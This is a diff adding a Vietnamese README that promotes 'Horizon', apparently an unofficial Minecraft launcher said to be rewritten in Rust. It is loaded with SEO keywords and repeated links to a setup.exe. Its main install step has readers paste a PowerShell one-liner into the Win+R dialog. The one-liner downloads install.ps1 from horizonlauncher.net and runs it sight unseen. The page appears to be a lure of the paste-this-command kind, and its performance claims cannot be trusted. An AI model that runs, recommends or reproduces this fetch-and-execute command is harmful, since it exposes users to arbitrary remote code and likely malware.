@@ -1,0 +1,181 @@
+<p align="center">
+  <a href="https://horizonlauncher.net/">
+    <img src="https://horizonlauncher.net/media/logo.png" width="120" height="120" alt="Horizon Minecraft launcher">
+  </a>
+</p>
+
+<h1 align="center">Tải Horizon — launcher Minecraft viết bằng Rust (Minecraft Rust Edition)</h1>
+
+<p align="center">
+  <b>Horizon Minecraft · client Java bằng Rust · cài Windows · FPS cao hơn · miễn phí</b>
+</p>
+
+<p align="center">🌐 [Русский](README.md) · [English](README.en.md) · [Українська](README.uk.md) · [Español](README.es.md) · [Português](README.pt.md) · [Deutsch](README.de.md) · [Français](README.fr.md) · [Italiano](README.it.md) · [Polski](README.pl.md) · [Türkçe](README.tr.md) · [简体中文](README.zh.md) · [日本語](README.ja.md) · [한국어](README.ko.md) · [العربية](README.ar.md) · [हिन्दी](README.hi.md) · [Indonesia](README.id.md) · **Tiếng Việt**</p>
+
+<p align="center">
+  <a href="https://horizonlauncher.net/"><strong>Trang chính thức horizonlauncher.net</strong></a><br>
+  <a href="https://horizonlauncher.net/en/download-horizon/">Tải Horizon</a> ·
+  <a href="https://horizonlauncher.net/en/install-horizon/">Cài launcher</a> ·
+  <a href="https://horizonlauncher.net/en/minecraft-rust/">Minecraft trên Rust</a> ·
+  <a href="https://horizonlauncher.net/en/faq/">FAQ</a>
+</p>
+
+<p align="center">
+  <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><img alt="Tải Horizon" src="https://img.shields.io/badge/Tai_Horizon-Windows_setup-1a120c?style=for-the-badge"></a>
+  <a href="https://horizonlauncher.net/"><img alt="horizonlauncher.net" src="https://img.shields.io/badge/Site-horizonlauncher.net-c45c26?style=for-the-badge"></a>
+</p>
+
+<p align="center">
+  <img alt="minecraft" src="https://img.shields.io/badge/Minecraft-Java_Edition-62b74b">
+  <img alt="rust" src="https://img.shields.io/badge/Client-Rust-dea584">
+  <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
+  <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
+  <img alt="free" src="https://img.shields.io/badge/Gia-Mien_phi-success">
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.44-lightgrey">
+</p>
+
+
+## Video và GIF Horizon
+
+MP4 đầy đủ trên site: [4K fly](https://horizonlauncher.net/media/mod-spotlight/reels/runaway.mp4) · [Nether](https://horizonlauncher.net/media/mod-spotlight/reels/nether.mp4) · [Shaders](https://horizonlauncher.net/media/mod-spotlight/reels/shaders.mp4) · [TNT](https://horizonlauncher.net/media/mod-spotlight/blast.mp4) · [обзор](https://horizonlauncher.net/media/mod-spotlight/reels/overview.mp4)
+
+<p align="center">
+  <a href="https://horizonlauncher.net/"><img src="media/fly.gif" width="740" alt="Tải Horizon — bay 4K Minecraft trên Rust"></a>
+</p>
+<p align="center"><i>Bay 4K qua thế giới Java Edition trên client Rust gốc của Horizon.</i></p>
+
+| Nether · Crimson Forest | Shader và ánh sáng |
+|:---:|:---:|
+| <a href="https://horizonlauncher.net/minecraft-rust/"><img src="media/nether.gif" width="360" alt="Nether trong Horizon"></a> | <a href="https://horizonlauncher.net/performance/"><img src="media/shaders.gif" width="360" alt="Shader Minecraft trên Horizon"></a> |
+
+<p align="center">
+  <a href="https://horizonlauncher.net/"><img src="media/blast.gif" width="640" alt="Vật lý TNT trong Horizon"></a>
+</p>
+<p align="center"><i>Thử TNT — vụ nổ được vẽ không cần JVM.</i></p>
+
+<p align="center">
+  <a href="https://horizonlauncher.net/"><img src="https://horizonlauncher.net/media/shots/fps-1292.webp" width="360" alt="Horizon 1292 FPS"></a>
+  <a href="https://horizonlauncher.net/launcher/"><img src="https://horizonlauncher.net/media/shots/launcher.webp" width="360" alt="Horizon launcher"></a>
+  <a href="https://horizonlauncher.net/download-horizon/"><img src="https://horizonlauncher.net/media/shots/survival-hq.webp" width="360" alt="Horizon survival"></a>
+</p>
+
+
+<div>
+
+**Horizon** là **launcher và client không chính thức của Minecraft Java Edition** viết bằng **Rust**, không phải JVM. Setup Windows mất khoảng một phút: cùng thế giới và server, thường **FPS cao hơn** vanilla Java.
+
+> Trang chuẩn và bộ cài: **[https://horizonlauncher.net/](https://horizonlauncher.net/)**  
+> File trực tiếp: **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)**
+
+Horizon **không** thuộc Mojang / Microsoft. Chỉ tải từ **horizonlauncher.net**.
+
+## Horizon Minecraft là gì
+
+**Horizon launcher** là launcher Windows cho Minecraft Java. Bên dưới là **Minecraft Rust Edition**: client viết lại bằng Rust.
+
+## Tải Horizon miễn phí (Windows)
+
+Cách đúng để **tải Horizon Minecraft** là site chính thức, không dùng mirror.
+
+| | |
+|---|---|
+| Tải Horizon | [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) |
+| Cài launcher | [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) |
+| Setup `.exe` | [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) |
+| Minecraft trên Rust | [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) |
+| Trang chính thức horizonlauncher.net | [https://horizonlauncher.net](https://horizonlauncher.net) |
+
+**Yêu cầu**
+
+- Windows 10 / Windows 11 x64
+- `horizon-launcher-setup.exe`
+- Horizon **0.2.44**
+- Miễn phí · site tiếng Nga và tiếng Anh
+
+## Cách cài Horizon — hai phương pháp
+
+Giống trang chính thức — hai cách cài launcher: [horizonlauncher.net](https://horizonlauncher.net/).
+
+| | |
+|---|---|
+| **Cài nhanh (Win+R)** | Win+R → dán lệnh → launcher tự cài và mở. |
+| **Cài thường** | Tải setup.exe, chạy bộ cài, rồi Chuẩn bị → Chơi. |
+
+### Cách 1. Cài nhanh bằng Win+R
+
+Copy lệnh, mở Win+R, Enter — Horizon tự tải, cài và mở.
+
+```bat
+powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
+```
+
+1. **Win+R.** Giữ Windows và R — hộp Run mở ra.
+2. **Dán.** Ctrl+V — dán lệnh bên dưới.
+3. **Enter.** Horizon tải, cài, mở — rồi Chuẩn bị → Chơi.
+
+Không cần quyền admin. Nếu Windows hỏi PowerShell thì xác nhận. Lệnh chỉ lấy `install.ps1` từ horizonlauncher.net.
+
+Hướng dẫn đầy đủ: [https://horizonlauncher.net/en/install-horizon/](https://horizonlauncher.net/en/install-horizon/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+
+### Cách 2. Cài thường (setup.exe)
+
+Cùng bộ cài Horizon — tải file, không cần lệnh. Hiện tại: **0.2.44**, Windows x64, ~60 MB.
+
+**[Tải Horizon — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.44
+
+1. Tải [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe).
+2. Chạy trình cài Windows.
+3. Mở launcher Horizon.
+4. Bấm **Chuẩn bị**, rồi **Chơi**.
+
+**Sau khi cài:** Mở launcher → Chuẩn bị → Chơi
+
+- Windows x64 · GPU DX12 / Vulkan · bất kỳ phiên bản Minecraft nào trên đĩa
+
+
+## Vì sao Minecraft trên Rust
+
+Vanilla chạy trên JVM. Horizon là client Rust gốc:
+
+- FPS cao hơn trên cùng máy;
+- ít giật hơn Java nặng;
+- launcher Windows không cần JDK thủ công;
+- mọi phiên bản game đã có trên đĩa.
+
+Xem thêm: [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/)
+
+## FAQ
+
+**Tải Horizon an toàn ở đâu?**  
+Chỉ [https://horizonlauncher.net](https://horizonlauncher.net) và [setup](https://horizonlauncher.net/horizon-launcher-setup.exe).
+
+**Đây có phải Minecraft chính thức?**  
+Không. Client và launcher không chính thức.
+
+**Có phải game Rust của Facepunch?**  
+Không. Đây là client Minecraft Java viết bằng ngôn ngữ Rust.
+
+**Có cần Java?**  
+Không cần cho client Rust của Horizon.
+
+## Mọi trang trên site
+
+- [Trang chủ](https://horizonlauncher.net/en/)
+- [Tải Horizon](https://horizonlauncher.net/en/download-horizon/)
+- [Cài launcher](https://horizonlauncher.net/en/install-horizon/)
+- [Minecraft trên Rust](https://horizonlauncher.net/en/minecraft-rust/)
+- [Launcher Horizon](https://horizonlauncher.net/en/launcher/)
+- [Máy chủ](https://horizonlauncher.net/en/server/)
+- [Mod](https://horizonlauncher.net/en/mods/)
+- [FAQ](https://horizonlauncher.net/en/faq/)
+- [Hiệu năng / FPS](https://horizonlauncher.net/en/performance/)
+- [Sitemap](https://horizonlauncher.net/sitemap.xml)
+
+## Thẻ SEO và từ khóa
+
+`tải Horizon` `launcher Horizon` `Minecraft Rust` `Minecraft Rust Edition` `FPS Minecraft` `horizonlauncher.net` `Win+R Horizon` `Horizon Win+R install` `Horizon setup.exe`
+
+**Tải Horizon:** [https://horizonlauncher.net](https://horizonlauncher.net) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+
+</div>
